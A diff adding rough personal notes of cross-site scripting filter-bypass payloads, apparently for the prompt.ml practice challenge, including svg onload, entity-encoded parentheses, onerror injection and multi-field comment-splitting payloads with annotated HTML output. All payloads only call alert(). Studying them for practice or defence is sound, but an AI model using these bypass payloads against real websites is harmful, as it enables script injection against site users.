@@ -1,2 +1,24 @@
+Search Bar(View Page Sourse) use wesite  prompt.ml 
+<script>alert()</script>
 
-s
+<svg/onload=alert(1); //bypass naive filter // condition ... user input ... <svg onload="alert(1)"></svg> ... // <article> ... <article>
+
+<svg><script>alert&#40;1)</script> // &#40; == ( //<svg> use when bypass filter 
+
+hello"type=image src onerror // = is fillerted then use in next line 
+="alert(1)          // onerror use when <script> and <img> fails 
+
+
+"><svg/a=#"onload='/*#*/alert(1)' //Fragment 1 (<svg/a=">) introduces <svg and then the characters /a="> — this yields an attribute name a with an empty value (or a stray token) depending on the parser, but critically it closes whatever quoted context the filter expected.
+Fragment 2 (title=""onload='/*">) injects onload='/* as an attribute value start for the (now-open) element.
+Fragment 3 (title="*/alert()'">) closes the JS comment /* ... */ and appends alert() as the remaining JS inside the attribute, then closes the quote.
+<p class="comment" title=""><svg/a="></p>//html source
+<p class="comment" title=""onload='/*"></p>
+<p class="comment" title="*/alert()'"></p>
+
+
+"><svg><!--#--><script><!--#-->alert()<!--#--></script>  //<!--#--> comment <!-- ,close comment --> ,# next line   
+<p class="comment" title=""><svg><!--" data-comment='{"id":0}'></p>       //html source
+<p class="comment" title="--><script><!--" data-comment='{"id":1}'></p>
+<p class="comment" title="-->alert()<!--" data-comment='{"id":2}'></p>
+<p class="comment" title="--></script>" data-comment='{"id":3}'></p>
